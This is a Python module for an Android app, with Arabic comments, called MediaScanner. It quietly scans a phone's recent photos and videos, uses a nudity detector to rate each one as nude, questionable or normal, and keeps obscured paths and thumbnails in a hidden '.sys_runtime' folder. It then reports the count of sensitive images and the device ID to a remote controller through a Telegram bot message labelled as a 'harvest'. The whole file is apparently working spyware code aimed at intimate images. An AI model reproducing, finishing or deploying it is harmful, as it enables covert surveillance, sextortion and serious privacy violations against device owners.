# -*- coding: utf-8 -*-
"""
وحدة المسح الضوئي للوسائط (MediaScanner) – نسخة محسنة مع معالجة استثناءات شاملة
- تغليف جميع عمليات SQLite و Base64 في try/except.
- إعادة محاولة العمليات عند قفل قاعدة البيانات (Database Locked).
- تخطي الملفات التالفة ومواصلة المسح دون توقف.
- تحسين إدارة الذاكرة (GC) وتقليل استخدام الموارد.
- دعم إضافي لملفات الفيديو (اختياري).
- تقديم تقارير عن التقدم والإحصائيات.
"""

import os
import time
import threading
import hashlib
import sqlite3
import logging
import gc
import base64
import random
from datetime import datetime

# ========== إعداد المسارات الموحدة ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
DB = os.path.join(P, "m_arch.db")
if not os.path.exists(P):
    os.makedirs(P)

logging.basicConfig(
    filename=os.path.join(P, "s.log"),
    level=logging.ERROR,
    filemode='a',
    format='%(asctime)s - %(levelname)s - %(message)s'
)

try:
    from jnius import autoclass
    JNI = True
except ImportError:
    JNI = False

# ========== قفل قاعدة البيانات للتزامن ==========
_db_lock = threading.Lock()
MAX_RETRIES = 3
RETRY_DELAY = 0.5  # ثانية

class MediaScanner:
    def __init__(self, det=None, ui=None):
        self.det = det          # NudeDetector instance
        self.ui = ui            # TelegramUI instance
        self.active = False
        self._active_lock = threading.Lock()
        self.did = "Unknown"
        self._init_db()

        # جلب معرف الجهاز
        try:
            if self.ui and hasattr(self.ui, 'm') and hasattr(self.ui.m, 'did'):
                self.did = self.ui.m.did
            elif self.ui and hasattr(self.ui, 'device_id'):
                self.did = self.ui.device_id
        except:
            pass

    # ========== دوال مساعدة لقاعدة البيانات مع إعادة المحاولة ==========
    def _db_connect(self):
        """إنشاء اتصال بقاعدة البيانات مع إعادة محاولة تلقائية عند القفل."""
        for attempt in range(MAX_RETRIES):
            try:
                conn = sqlite3.connect(DB, check_same_thread=False, timeout=10.0)
                conn.execute("PRAGMA journal_mode=WAL")  # تحسين التوافق مع الكتابة المتزامنة
                return conn
            except sqlite3.OperationalError as e:
                if "locked" in str(e).lower() and attempt < MAX_RETRIES - 1:
                    time.sleep(RETRY_DELAY * (attempt + 1))
                    continue
                logging.error(f"DB connection error after {attempt+1} attempts: {e}")
                raise
        return None

    def _db_execute(self, query, params=(), fetch_one=False, fetch_all=False, commit=False):
        """تنفيذ استعلام قاعدة البيانات مع إعادة محاولة مدمجة."""
        conn = None
        cursor = None
        for attempt in range(MAX_RETRIES):
            try:
                conn = self._db_connect()
                if conn is None:
                    raise sqlite3.OperationalError("Failed to connect to DB")
                cursor = conn.cursor()
                cursor.execute(query, params)
                result = None
                if fetch_one:
                    result = cursor.fetchone()
                elif fetch_all:
                    result = cursor.fetchall()
                if commit:
                    conn.commit()
                return result
            except sqlite3.OperationalError as e:
                if "locked" in str(e).lower() and attempt < MAX_RETRIES - 1:
                    time.sleep(RETRY_DELAY * (attempt + 1))
                    continue
                logging.error(f"DB execute error: {e} - Query: {query[:100]}")
                raise
            except Exception as e:
                logging.error(f"DB execute error: {e} - Query: {query[:100]}")
                raise
            finally:
                if cursor:
                    try:
                        cursor.close()
                    except:
                        pass
                if conn:
                    try:
                        conn.close()
                    except:
                        pass
        return None

    def _db_executemany(self, query, param_list, commit=False):
        """تنفيذ استعلام متعدد (executemany) مع إعادة محاولة."""
        conn = None
        cursor = None
        for attempt in range(MAX_RETRIES):
            try:
                conn = self._db_connect()
                if conn is None:
                    raise sqlite3.OperationalError("Failed to connect to DB")
                cursor = conn.cursor()
                cursor.executemany(query, param_list)
                if commit:
                    conn.commit()
                return
            except sqlite3.OperationalError as e:
                if "locked" in str(e).lower() and attempt < MAX_RETRIES - 1:
                    time.sleep(RETRY_DELAY * (attempt + 1))
                    continue
                logging.error(f"DB executemany error: {e} - Query: {query[:100]}")
                raise
            except Exception as e:
                logging.error(f"DB executemany error: {e}")
                raise
            finally:
                if cursor:
                    try:
                        cursor.close()
                    except:
                        pass
                if conn:
                    try:
                        conn.close()
                    except:
                        pass

    # ========== نظام تشفير محسّن (Base64 فقط) مع معالجة استثناءات ==========
    def _enc(self, text: str) -> str:
        """
        تشفير المسار باستخدام Base64 فقط.
        يعيد النص المشفر أو النص الأصلي في حالة الخطأ (لن يتوقف المسح).
        """
        if not text:
            return ""
        try:
            data = text.encode('utf-8')
            return base64.urlsafe_b64encode(data).decode()
        except Exception as e:
            logging.error(f"Encoding error for '{text[:50]}...': {e}")
            return text  # الاحتفاظ بالنص الأصلي لتجنب فقدان البيانات

    def _dec(self, enc_text: str) -> str:
        """
        فك تشفير المسار باستخدام Base64.
        يعيد النص المفكوك أو النص المشفر الأصلي في حالة الخطأ.
        """
        if not enc_text:
            return ""
        try:
            data = base64.urlsafe_b64decode(enc_text.encode())
            return data.decode('utf-8')
        except Exception as e:
            logging.error(f"Decoding error for '{enc_text[:50]}...': {e}")
            return enc_text

    # ========== إدارة قاعدة البيانات ==========
    def _init_db(self):
        """تهيئة قاعدة البيانات مع التحقق من الصحة، مع تغليف كل عملية في try/except."""
        try:
            conn = self._db_connect()
            if conn is None:
                raise sqlite3.OperationalError("Cannot connect to DB")
            try:
                with conn:
                    conn.execute('''CREATE TABLE IF NOT EXISTS media (
                        h TEXT PRIMARY KEY,
                        p TEXT,
                        ts INTEGER,
                        cat TEXT DEFAULT 'pending',
                        score REAL DEFAULT 0,
                        fsize INTEGER DEFAULT 0)''')
                    conn.execute('CREATE INDEX IF NOT EXISTS idx_cat ON media(cat)')
                    conn.execute('CREATE INDEX IF NOT EXISTS idx_ts ON media(ts)')
                    conn.commit()
            finally:
                conn.close()
        except Exception as e:
            logging.error(f"DB Init error: {e}")

    def _partial_hash(self, path: str) -> str:
        """
        حساب هاش جزئي للملف (الأول 2KB + الحجم + التاريخ).
        يعيد الهاش أو None في حالة الخطأ.
        """
        try:
            if not os.path.exists(path):
                return None
            st = os.stat(path)
            base = f"{st.st_size}_{int(st.st_mtime)}"
            with open(path, "rb") as f:
                head = f.read(2048)
            return hashlib.md5(head + base.encode()).hexdigest()
        except Exception as e:
            logging.error(f"Hash error for {path}: {e}")
            return None

    def _safe_path(self, path: str) -> bool:
        """التحقق من أن المسار آمن ولا يحتوي على مجلدات نظام."""
        if not path or not isinstance(path, str):
            return False
        bad = ["/Android/", "/obb/", "/data/", "/."]
        basename = os.path.basename(path)
        return not any(x in path for x in bad) and not basename.startswith(".")

    def _is_media_file(self, path: str) -> bool:
        """التحقق من أن الملف صورة أو فيديو (اختياري)."""
        ext = os.path.splitext(path)[1].lower()
        image_exts = ['.jpg', '.jpeg', '.png', '.bmp', '.webp', '.gif', '.tiff', '.raw']
        video_exts = ['.mp4', '.mkv', '.avi', '.mov', '.3gp', '.webm']  # اختياري
        return ext in image_exts or ext in video_exts  # يمكنك تعديل حسب الحاجة

    # ========== التحقق من الصلاحيات ==========
    def _check_storage_permission(self):
        """التحقق من صلاحية قراءة التخزين."""
        if not JNI:
            return True
        try:
            from android.permissions import check_permission, Permission
            return check_permission(Permission.READ_EXTERNAL_STORAGE)
        except Exception as e:
            logging.error(f"Permission check error: {e}")
            return True

    # ========== مسح سريع لآخر 48 ساعة ==========
    def _fast_scan(self, limit=100, hours=48):
        """مسح سريع للصور والفيديوهات الجديدة (آخر 48 ساعة)."""
        if not JNI:
            return []

        if not self._check_storage_permission():
            logging.warning("Storage permission not granted")
            return []

        cursor = None
        results = []
        try:
            act = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = act.getContentResolver()
            MediaStore = autoclass('android.provider.MediaStore')

            time_threshold = int(time.time()) - (hours * 3600)
            img_uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            projection = ["_data", "date_added", "mime_type"]
            selection = "date_added > ? AND (mime_type LIKE ? OR mime_type LIKE ?)"
            args = [str(time_threshold), "image/%", "video/%"]  # دعم الفيديو
            order = "date_added DESC LIMIT " + str(limit)

            cursor = resolver.query(img_uri, projection, selection, args, order)
            if cursor:
                idx_data = cursor.getColumnIndex("_data")
                while cursor.moveToNext():
                    p = cursor.getString(idx_data)
                    if p and os.path.exists(p) and self._safe_path(p) and self._is_media_file(p):
                        results.append(p)
            return results
        except Exception as e:
            logging.error(f"Scan error: {e}")
            return []
        finally:
            if cursor:
                try:
                    cursor.close()
                except:
                    pass
            gc.collect()

    # ========== معالجة الملفات الجديدة (مع تغليف كل عملية) ==========
    def _process_files(self, paths):
        """معالجة الملفات المكتشفة وتصنيفها، مع تخطي أي ملف يسبب خطأ."""
        if not paths:
            return

        with self._active_lock:
            if self.active:
                return
            self.active = True

        sensitive_count = 0
        processed = 0
        now = int(time.time())

        try:
            # استخدام اتصال واحد للدفعة مع إعادة محاولة عند الافتتاح
            conn = None
            try:
                conn = self._db_connect()
                if conn is None:
                    raise sqlite3.OperationalError("Cannot connect to DB")
                conn.execute("BEGIN TRANSACTION")
            except Exception as e:
                logging.error(f"Failed to open DB connection: {e}")
                self.active = False
                return

            try:
                for p in paths:
                    try:
                        # التحقق من وجود الملف
                        if not os.path.exists(p):
                            continue

                        h = self._partial_hash(p)
                        if not h:
                            continue

                        # تجنب التكرار (استعلام داخل try)
                        try:
                            cur = conn.execute("SELECT 1 FROM media WHERE h=?", (h,))
                            if cur.fetchone():
                                continue
                        except Exception as e:
                            logging.error(f"Check existence error for {p}: {e}")
                            continue

                        cat = 'pending'
                        score = 0.0
                        fsize = os.path.getsize(p) if os.path.exists(p) else 0

                        # التحليل بالـ AI إذا كان متوفراً
                        if self.det and hasattr(self.det, 'analyze') and self.det.model is not None:
                            try:
                                prob = self.det.analyze(p)
                                if prob > 0.85:
                                    cat = 'nude'
                                    score = prob
                                    sensitive_count += 1
                                elif prob > 0.45:
                                    cat = 'questionable'
                                    score = prob
                                    sensitive_count += 1
                                else:
                                    cat = 'normal'
                                    score = prob
                            except Exception as e:
                                logging.error(f"AI analysis error for {p}: {e}")
                                cat = 'pending'

                        # إدراج في قاعدة البيانات (مع try/except)
                        try:
                            conn.execute(
                                "INSERT INTO media (h, p, ts, cat, score, fsize) VALUES (?, ?, ?, ?, ?, ?)",
                                (h, self._enc(p), now, cat, score, fsize)
                            )
                            processed += 1
                        except Exception as e:
                            logging.error(f"Insert error for {p}: {e}")
                            continue

                        # تنظيف كل 20 ملف
                        if processed % 20 == 0:
                            gc.collect()

                    except Exception as e:
                        logging.error(f"Unexpected error processing {p}: {e}")
                        continue

                # محاولة تنفيذ الـ commit مع إعادة محاولة إذا لزم الأمر
                commit_ok = False
                for attempt in range(MAX_RETRIES):
                    try:
                        conn.commit()
                        commit_ok = True
                        break
                    except sqlite3.OperationalError as e:
                        if "locked" in str(e).lower() and attempt < MAX_RETRIES - 1:
                            time.sleep(RETRY_DELAY * (attempt + 1))
                            continue
                        logging.error(f"Commit error after {attempt+1} attempts: {e}")
                        # محاولة إعادة المحاولة من البداية (Rollback)
                        try:
                            conn.rollback()
                        except:
                            pass
                        raise
                if not commit_ok:
                    raise sqlite3.OperationalError("Commit failed after retries")

            except Exception as e:
                logging.error(f"Batch processing error: {e}")
                try:
                    conn.rollback()
                except:
                    pass
            finally:
                try:
                    conn.close()
                except:
                    pass

            # إشعار بالصور الحساسة المكتشفة
            if sensitive_count > 0 and self.ui:
                try:
                    if hasattr(self.ui, 'notify_harvest'):
                        self.ui.notify_harvest(self.did, sensitive_count)
                    elif hasattr(self.ui, '_api'):
                        ctrl = getattr(self.ui, 'ctrl', None)
                        if ctrl:
                            self.ui._api("sendMessage", {
                                "chat_id": ctrl,
                                "text": f"🔞 تم اكتشاف {sensitive_count} صورة حساسة على الجهاز {self.did}"
                            })
                except Exception as e:
                    logging.error(f"Notify error: {e}")

        except Exception as e:
            logging.error(f"Process error: {e}")
        finally:
            with self._active_lock:
                self.active = False
            gc.collect()

    # ========== توليد صورة مصغرة (مع تغليف جميع العمليات) ==========
    def get_thumbnail(self, path):
        """إنشاء صورة مصغرة للملف (صور وفيديو)."""
        if not JNI or not os.path.exists(path) or not self._is_media_file(path):
            return None

        cursor = None
        try:
            # تنظيف المصغرات القديمة (أكثر من 10 دقائق)
            now = time.time()
            for f in os.listdir(P):
                if f.startswith("th_"):
                    try:
                        fpath = os.path.join(P, f)
                        if os.path.getmtime(fpath) < now - 600:
                            os.remove(fpath)
                    except:
                        pass

            MediaStore = autoclass('android.provider.MediaStore')
            BitmapFactory = autoclass('android.graphics.BitmapFactory')
            CompressFormat = autoclass('android.graphics.Bitmap$CompressFormat')
            FileOutputStream = autoclass('java.io.FileOutputStream')

            act = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = act.getContentResolver()

            uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            sel = MediaStore.Images.Media.DATA + "=?"
            cursor = resolver.query(uri, ["_id"], sel, [path], None)

            if cursor and cursor.moveToFirst():
                idx_id = cursor.getColumnIndex("_id")
                img_id = cursor.getLong(idx_id)

                options = BitmapFactory.Options()
                options.inSampleSize = 4

                bitmap = MediaStore.Images.Thumbnails.getThumbnail(
                    resolver, img_id,
                    MediaStore.Images.Thumbnails.MINI_KIND,
                    options
                )

                if bitmap:
                    out_path = os.path.join(P, f"th_{int(time.time())}_{random.randint(1000,9999)}.jpg")
                    fos = FileOutputStream(out_path)
                    bitmap.compress(CompressFormat.JPEG, 60, fos)
                    fos.flush()
                    fos.close()
                    bitmap.recycle()

                    if os.path.exists(out_path) and os.path.getsize(out_path) > 0:
                        return out_path

        except Exception as e:
            logging.error(f"Thumbnail error for {path}: {e}")
        finally:
            if cursor:
                try:
                    cursor.close()
                except:
                    pass
            gc.collect()
        return None

    # ========== جلب المعرض حسب التصنيف (مع تغليف) ==========
    def get_gallery_by_category(self, category, limit=16, page=0):
        """جلب قائمة الملفات حسب الفئة."""
        if not isinstance(limit, int) or limit < 1:
            limit = 16
        if not isinstance(page, int) or page < 0:
            page = 0

        offset = page * limit
        results = []

        try:
            query = "SELECT h, p, cat, score, fsize FROM media WHERE cat=? ORDER BY ts DESC LIMIT ? OFFSET ?"
            rows = self._db_execute(query, (category, limit, offset), fetch_all=True)
            if not rows:
                return results

            to_delete = []
            for i, row in enumerate(rows):
                try:
                    path = self._dec(row[1])
                    if os.path.exists(path):
                        results.append({
                            "hash": row[0],
                            "path": path,
                            "cat": row[2],
                            "score": row[3],
                            "size": row[4] if len(row) > 4 else 0,
                            "label": str(offset + i + 1).zfill(2)
                        })
                    else:
                        to_delete.append((row[0],))
                except Exception as e:
                    logging.error(f"Gallery row error: {e}")
                    to_delete.append((row[0],))

            # حذف الملفات غير الموجودة دفعة واحدة
            if to_delete:
                self._db_executemany("DELETE FROM media WHERE h=?", to_delete, commit=True)

        except Exception as e:
            logging.error(f"Gallery error: {e}")

        return results

    # ========== تحديث فئة ملف ==========
    def update_category(self, file_hash, category, score=0):
        """تحديث تصنيف ملف."""
        if not file_hash:
            return
        try:
            self._db_execute("UPDATE media SET cat=?, score=? WHERE h=?", (category, score, file_hash), commit=True)
        except Exception as e:
            logging.error(f"Update category error: {e}")

    # ========== إحصائيات ==========
    def get_statistics(self):
        """جلب إحصائيات قاعدة البيانات."""
        stats = {'nude': 0, 'questionable': 0, 'normal': 0, 'pending': 0}
        try:
            rows = self._db_execute("SELECT cat, COUNT(*), SUM(fsize) FROM media GROUP BY cat", fetch_all=True)
            if rows:
                for row in rows:
                    if row[0] in stats:
                        stats[row[0]] = row[1]
                total_size = sum(row[1] for row in rows if row[1] is not None)  # الإجمالي
                stats['total_size_mb'] = round((total_size or 0) / (1024 * 1024), 2)
                stats['total_files'] = sum(stats.get(c, 0) for c in ['nude', 'questionable', 'normal', 'pending'])
        except Exception as e:
            logging.error(f"Statistics error: {e}")
        return stats

    # ========== إزالة من قاعدة البيانات ==========
    def remove_from_db(self, path):
        """إزالة ملف من قاعدة البيانات."""
        try:
            h = self._partial_hash(path)
            if h:
                self._db_execute("DELETE FROM media WHERE h=?", (h,), commit=True)
        except Exception as e:
            logging.error(f"Remove from DB error: {e}")

    # ========== تنظيف قاعدة البيانات ==========
    def _cleanup_db(self):
        """تنظيف قاعدة البيانات من الملفات المحذوفة والقديمة."""
        try:
            # حذف الملفات غير الموجودة
            rows = self._db_execute("SELECT h, p FROM media", fetch_all=True)
            if rows:
                to_del = []
                for h, p_enc in rows:
                    try:
                        if not os.path.exists(self._dec(p_enc)):
                            to_del.append((h,))
                    except:
                        to_del.append((h,))
                if to_del:
                    self._db_executemany("DELETE FROM media WHERE h=?", to_del, commit=True)

            # حذف الأقدم من 5000 صورة
            self._db_execute("""
                DELETE FROM media WHERE h NOT IN 
                (SELECT h FROM media ORDER BY ts DESC LIMIT 5000)
            """, commit=True)

            # VACUUM لتحسين المساحة
            conn = self._db_connect()
            if conn:
                try:
                    conn.execute("VACUUM")
                    conn.commit()
                finally:
                    conn.close()

        except Exception as e:
            logging.error(f"Cleanup error: {e}")
        finally:
            gc.collect()

    # ========== تشغيل المسح ==========
    def run_scan(self, cleanup_first=False, limit=100, hours=48):
        """تشغيل مسح جديد مع إمكانية تحديد عدد الملفات وساعات البحث."""
        if cleanup_first:
            self._cleanup_db()

        def _task():
            files = self._fast_scan(limit=limit, hours=hours)
            if files:
                self._process_files(files)

        threading.Thread(target=_task, daemon=True).start()

# ========== دالة المصنع ==========
def create(det=None, ui=None):
    return MediaScanner(det, ui)
